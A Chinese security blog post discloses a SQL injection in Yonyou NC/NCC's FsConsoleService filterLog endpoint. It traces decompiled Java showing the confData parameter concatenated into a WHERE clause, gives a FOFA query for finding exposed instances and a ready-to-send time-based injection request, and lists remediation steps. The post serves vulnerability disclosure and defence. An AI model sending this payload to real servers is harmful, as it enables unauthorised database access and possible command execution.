---
title: "用友NC/NCC文件服务器配置管理 FsConsoleService SQL注入漏洞"
source: https://mrxn.net/jswz/yonyou-ncc-uap-pub-fs-console-FsConsoleService-confData-sqli.html
---

# 用友NC/NCC文件服务器配置管理 FsConsoleService SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/3/16 18:27
* 835浏览
* [0评论](#comment)
* 2小时
  阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

用友NC是由用友公司开发的一套面向大型企业和集团型企业的管理软件产品系列。这一系列产品基于全球最新的互联网技术、云计算技术和移动应用技术，旨在帮助企业创新管理模式、引领商业变革。用友NC、NC Cloud uap.pub.fs.console.FsConsoleService 接口存在
[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
漏洞，攻击者通过利用SQL注入漏洞配合数据库xp\_cmdshell可以执行任意命令，从而控制服务器。

# 影响版本

NC633 / NC65 / NCC1811 / NCC1903 / NCC1909 / NCC2005

# fofa语法

> `app="用友-UFIDA-NC"`

# 漏洞分析

看下 uap.pub.fs.console.FsConsoleService 的业务逻辑实现

```
package uap.pub.fs.console;

import com.mongodb.MongoClient;
import com.mongodb.ServerAddress;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import nc.bs.framework.common.InvocationInfoProxy;
import nc.bs.framework.core.conf.ClusterConf;
import nc.bs.framework.core.conf.Configuration;
import nc.bs.framework.core.conf.ServerConf;
import nc.bs.framework.server.BusinessAppServer;
import nc.bs.logging.Logger;
import nc.jdbc.framework.exception.DbException;
import nc.vo.ml.NCLangRes4VoTransl;
import nc.vo.pub.lang.UFDateTime;
import org.apache.commons.lang.ArrayUtils;
import org.apache.commons.lang.StringUtils;
import uap.ae.pub.crypto.RSAKeysGenerator;
import uap.bs.fs.framework.service.ConfFileReader;
import uap.bs.fs.framework.service.ConfFileWriter;
import uap.bs.fs.framework.service.FsClusterSync;
import uap.pub.fs.client.FileStorageClient;
import uap.pub.fs.client.RestFileTransfer;
import uap.pub.fs.docCenter.DcUpdateToFs;
import uap.pub.fs.domain.basic.FileHeader;
import uap.pub.fs.domain.basic.ModuleStorageCache;
import uap.pub.fs.domain.basic.ModuleVO;
import uap.pub.fs.domain.basic.QueryParams;
import uap.pub.fs.domain.basic.RequestInfo;
import uap.pub.fs.exception.FileStorageException;
import uap.pub.fs.imex.service.FileImExVO;
import uap.pub.fs.imex.service.ImportExportUtils;
import uap.pub.fs.meta.service.IFileMetaQueryService;
import uap.pub.fs.meta.service.ILogQueryService;
import uap.pub.fs.module.service.IModuleQueryService;
import uap.pub.fs.prop.service.FsPropertyReader;
import uap.pub.fs.util.FileStorageUtil;
import uap.pub.fs.util.FsDateUtilities;
import uap.pub.fs.util.FsLogger;
import uap.pub.fs.util.FsServiceUtil;

@WebServlet({"/FsConsoleService"})
public class FsConsoleService extends HttpServlet {
    private static final long serialVersionUID = 1L;
    private IFileMetaQueryService queryService;
    private IModuleQueryService moduleQueryService;
    private ILogQueryService logQueryService;

    public FsConsoleService() {
    }

    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        this.doPost(request, response);
    }

    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        switch (request.getParameter("operType")) {
            case "login":
                this.loginAction(request, response);
                break;
            case "sysConf":
                this.sysConfAction(request, response);
                break;
            case "syncConfig":
                this.syncConfigAction(request, response);
                break;
            case "displayConf":
                this.displayConfAction(request, response);
                break;
            case "checkService":
                this.checkService(request, response);
                break;
            case "startService":
                this.startService(request, response);
                break;
            case "connTest":
                this.connTest(request, response);
                break;
            case "UFSTest":
                this.UFSTest(request, response);
                break;
            case "import":
                this.importFiles(request, response);
                break;
            case "export":
                this.exportFiles(request, response);
                break;
            case "update":
                this.updateDC2UFS(request, response);
                break;
            case "loadDataSources":
                this.loadDataSources(request, response);
                break;
            case "addModule":
                this.addModule(request, response);
                break;
            case "queryModule":
                this.queryModule(request, response);
                break;
            case "deleteModule":
                this.deleteModule(request, response);
                break;
            case "updateModule":
                this.updateModule(request, response);
                break;
            case "getKey":
                this.getKey(request, response);
                break;
            case "refreshKey":
                this.refreshKey(request, response);
                break;
            case "readLogConf":
                this.readLogConf(request, response);
                break;
            case "saveLogConf":
                this.saveLogConf(request, response);
                break;
            case "clearlLogData":
                this.clearlLogData(request, response);
                break;
            case "filterLog":
                this.filterLog(request, response);
                break;
            case "refreshLog":
                this.refreshLog(request, response);
        }

    }
```

根据
`operType`
的值进入对应的处理流程，当
`operType=filterLog`
是进入
`filterLog`
函数，其业务逻辑实现如下

```
private void filterLog(HttpServletRequest request, HttpServletResponse response) throws IOException {
    String confData = request.getParameter("confData").trim();
    StringBuffer sb = new StringBuffer();
    RequestInfo[] logs;
    if (StringUtils.isNotEmpty(confData)) {
        String[] keyValue = confData.split("=");
        if (keyValue.length < 2) {
            logs = this.getLogQueryService().getAllLogs();
        } else {
            logs = this.getLogQueryService().getLog(keyValue[0], keyValue[1]);
        }
    } else {
        logs = this.getLogQueryService().getAllLogs();
    }

    if (logs != null && logs.length > 0) {
        sb.append("{");

        for(int i = 0; i < logs.length; ++i) {
            RequestInfo log = logs[i];
            sb.append("\"").append(i).append("\":");
            sb.append("{\"client\":\"").append(log.getClient()).append("\",\"requestUser\":\"").append(log.getRequestUser()).append("\",\"operType\":\"").append(log.getOperType()).append("\",\"requestURL\":\"").append(log.getRequestURL()).append("\",\"content\":\"").append(log.getContent()).append("\",\"startTime\":\"").append(log.getStartTime()).append("\",\"endTime\":\"").append(log.getEndTime()).append("\"}");
            if (i != logs.length - 1) {
                sb.append(",");
            }
        }

        sb.append("}");
    }

    response.setContentType("text/html; charset=GBK");
    PrintWriter out = response.getWriter();

    try {
        out.print(sb.toString());
    } finally {
        out.flush();
        out.close();
    }

}
```

如果 confData 为空或者以
`=`
分割后的数组长度小于2则直接进入
`this.getLogQueryService().getAllLogs();`
函数，或者将分割后的数组前两个分别作为 key 和 value 代入
`this.getLogQueryService().getLog(keyValue[0], keyValue[1]);`
函数

```
public RequestInfo[] getLog(String key, String value) {
    String dsName = this.getDsName();
    StringBuffer clause = new StringBuffer();
    clause.append(key);
    if (!StringUtils.isEmpty(value) && !"null".equalsIgnoreCase(value)) {
        clause.append("='").append(value).append("'");
    } else {
        clause.append(" is null");
    }

    clause.append(" ORDER BY TS DESC");
    RequestInfo[] LogVOs = (RequestInfo[])(new DBOperDelegator(RequestInfo.class, dsName)).loadByClause(clause.toString());
    return LogVOs != null && LogVOs.length > 0 ? LogVOs : new RequestInfo[0];
}
```

主要格式化处理
`key`
和
`value`
后组成SQL语句一部分，无任何过滤和校验，组合后的部分样例：
`key='value'`
格式，然后代入
`DBOperDelegator`
的
`loadByClause`
方法内，而此方法逻辑如下

```
public Object[] loadByClause(String clause) {
    IMappingMeta meta = this.getMappingMeta();

    Object[] var10;
    try {
        Collection list = (new BaseDAO(this.dsName)).retrieveByClause(this.getVoClz(), meta, clause);
        var10 = this.transArrays(list.toArray());
    } catch (Exception e) {
        String msg = "db operate: load by clause error. ";
        FsLogger.error(msg + e);
        throw new FileStorageDBException(msg, e);
    } finally {
        DataSourceUtil.postProcess(true);
    }

    return var10;
}
```

将
`clause`
代入
`retrieveByClause`
函数，其实现逻辑如下

```
public Collection retrieveByClause(Class className, IMappingMeta meta, String condition) throws DAOException {
    PersistenceManager manager = null;

    Collection e;
    try {
        manager = this.createPersistenceManager(this.dataSource);
        e = manager.retrieveByClause(className, meta, condition);
    } catch (DbException e) {
        Logger.error(e.getMessage(), e);
        throw new DAOException(e.getMessage());
    } finally {
        if (manager != null) {
            manager.release();
        }

    }

    return e;
}
```

最终将
`condition`
组合在sql语句里并调用
`executeQuery`
执行SQL语句，整个过程无任何过滤校验，造成SQL注入漏洞。

```
public Collection retrieveByClause(Class className, IMappingMeta meta, String condition, String[] fields, SQLParameter params) throws DbException {
    String sql = SQLHelper.getSelectSQL(meta.getTableName(), fields);
    if (condition != null && condition.length() != 0) {
        if (condition.trim().toUpperCase().startsWith("ORDER ")) {
            sql = sql + " " + condition;
        } else {
            sql = sql + " WHERE " + condition;
        }
    }

    BaseProcessor processor = new BeanMappingListProcessor(className, meta, fields);
    return params != null ? (Collection)this.session.executeQuery(sql, params, processor) : (Collection)this.session.executeQuery(sql, processor);
}
```

# 漏洞复现

默认访问接口会返回所有日志内容

![用友NC/NCC文件服务器配置管理 FsConsoleService SQL注入漏洞](https://image.mrxn.net/da38e5d46b7547a1a5cd2951f1144930.webp)

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
验证

```
GET /servlet/~uapbs/uap.pub.fs.console.FsConsoleService?confData=guid%3d233%27;WAITFOR+DELAY+'0:0:4'--+&operType=filterLog HTTP/1.0
Host: nc.mrxn.net
```

![用友NC/NCC文件服务器配置管理 FsConsoleService SQL注入漏洞](https://image.mrxn.net/1d5535b0ac28448f9d609227c58a802e.webp)

# 解决方案

1、将hotwebs/fs/console.html和hotwebs/fs/manage.html删除。

2、删除hotwebs\fs\WEB-INF\web.xml里的如下配置

```
<servlet>
<servlet-name>FileConsoleService</servlet-name>
<servlet-class>uap.pub.fs.console.FsConsoleService</servlet-class>
</servlet>
<servlet-mapping>
<servlet-name>FileConsoleService</servlet-name>
<url-pattern>/console</url-pattern>
</servlet-mapping>
```

重启服务。

# 参考

* <https://security.yonyou.com/#/noticeInfo?id=213>

* 标签：
* [#
  漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#
  web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#
  SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#
  代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#
  Java](https://mrxn.net/tag/Java)
* [#
  用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录

×



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：
[Mrxn's Blog](https://mrxn.net/)
  
文章标题：
[用友NC/NCC文件服务器配置管理 FsConsoleService SQL注入漏洞](https://mrxn.net/jswz/yonyou-ncc-uap-pub-fs-console-FsConsoleService-confData-sqli.html)
  
文章链接：
<https://mrxn.net/jswz/yonyou-ncc-uap-pub-fs-console-FsConsoleService-confData-sqli.html>
  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

设备上扫码阅读



var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-ncc-uap-pub-fs-console-FsConsoleService-confData-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

手机扫码阅读



var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-ncc-uap-pub-fs-console-FsConsoleService-confData-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});